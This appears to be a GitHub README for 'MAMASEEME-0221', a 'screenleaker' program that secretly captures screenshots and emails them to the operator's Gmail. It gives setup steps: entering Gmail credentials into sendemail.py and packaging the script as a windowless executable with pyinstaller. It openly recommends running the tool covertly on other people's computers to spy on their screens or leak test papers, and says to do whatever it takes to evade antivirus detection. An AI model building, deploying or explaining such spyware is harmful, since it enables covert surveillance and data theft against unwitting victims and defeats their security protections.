# MAMASEEME-0221

This screenleaker sends screenshots to your gmail secretly.

![image](https://github.com/jason1343/MAMASEEME-0221/assets/96876149/966c973f-b455-4142-8e73-868ff259424b)

---

1. You need to create your app password first.

2. Then write your app password and gmail in these code..
      -sendemail.py
        
        line 29, msg['To'] = 'your gmail'
        line 30, msg['From'] = 'your gmail'
        
        line 47, server.login('your gmail', 'your app password')

3. Save screenleaker.py

4. Thats it, you need to convert screenleaker.py to execution files using pyinstaller -w -F [filename.py]

5. Then all set, To run this, the screenleaker.exe and kiss.txt should be in same folder.

You can use this to leak test papers or see others computer screen.

I think this file is not caught by computer vaccine.
If this file gets caught, you need to do all the things you can do to avoid vaccine.


HOW TO USE IT
 - Run screenleaker.exe(converted to exe file) on others computer secretly(just whatever you can do).
